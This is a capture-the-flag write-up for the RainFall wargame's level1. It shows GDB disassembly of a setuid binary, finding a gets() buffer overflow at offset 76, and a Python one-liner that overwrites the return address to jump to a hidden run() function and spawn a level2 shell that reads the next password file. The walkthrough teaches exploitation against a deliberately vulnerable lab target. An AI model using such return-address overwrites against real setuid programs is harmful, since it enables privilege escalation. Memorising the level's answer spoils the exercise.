```sh
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
level1@RainFall:~$ ./level1
42
level1@RainFall:~$ ./level1 42
42
level1@RainFall:~$ 
```
There is one excutable file **level1**, it works like cat, take standard input and shutting down program. \
\
Run the binary file with GDB.
```sh
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
...
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
...
```
```sh
(gdb) disas main
   Dump of assembler code for function main:
   0x08048480 <+0>:        push      %ebp
   0x08048481 <+1>:        mov       %esp,%ebp
   0x08048483 <+3>:        and       $0xfffffff0,%esp
   0x08048486 <+6>:        sub       $0x50,%esp
   0x08048489 <+9>:        lea       0x10(%esp),%eax
   0x0804848d <+13>:       mov       %eax,(%esp)
   0x08048490 <+16>:       call      0x8048340 <gets@plt>
   0x08048495 <+21>:       leave  
   0x08048496 <+22>:       ret   
End of assembler dump.
```
We can see one function name of run() with ```info functions```, but in the main function there is no trigger to jump in run function. what is in there?
```sh
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave  
   0x0804847f <+59>:    ret    
```
Ohh.. in the run+53, there is a system call, so we should run ```run()``` function? \
We can check what is in there.
```sh
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```
INTERESTING! \
So we need run the function which is not called, but how?

The hint is in ```gets()``` function, which has ```buffer overflow``` vulnerability because it never specifies the read buffer size.

Since we know that we can use ```buffer overflow```, we can try to find exact location where to insert address of ```run()``` function to call it. \
For this, we wrote python script to find easier location of buffer overflow,
```sh
python level1/Ressources/helper.py
=== Buffer Overflow Pattern Generator & Offset Finder ===
Enter the length of the pattern to generate: 100
Generated pattern (100 bytes):
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a
...
```
```sh
level1@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac"' > /tmp/exploit
level1@RainFall:~$ gdb level1
(gdb) r < /tmp/exploit
Starting program: /home/user/level1/level1 < /tmp/exploit

Program received signal SIGSEGV, Segmentation fault.
0x63613563 in ?? ()
```
We can find weird address at the moment of segmentation fault, ```0x63613563```, this mean the EIP register is corrupted by buffer. \
The linux system save the data in the lowest byte order, which is called **Little Endian**. So we have to read that address in reverse, ```0x63```, ```0x35```, ```0x61```, ```0x63``` which is "c5ac" in ASCII. \
In the python script, we can find easily the exact offset location of string,
```sh
Enter the value to find (e.g., 'aa1aa2'): c5ac
'c5ac' found at offset: 76
```
So from offset 76, everything that comes after will be counted as ```buffer overflow```. \
After, simply, we just have to put the address ```run()``` function, after 76 offset in the reverse order.
```sh
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
```
in this case also, we need convert the address by little endian form,
```...ac4a\x44\x84\x04\x08```
```sh
level1@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4a\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass            
(hidden)
```
level1 passed!

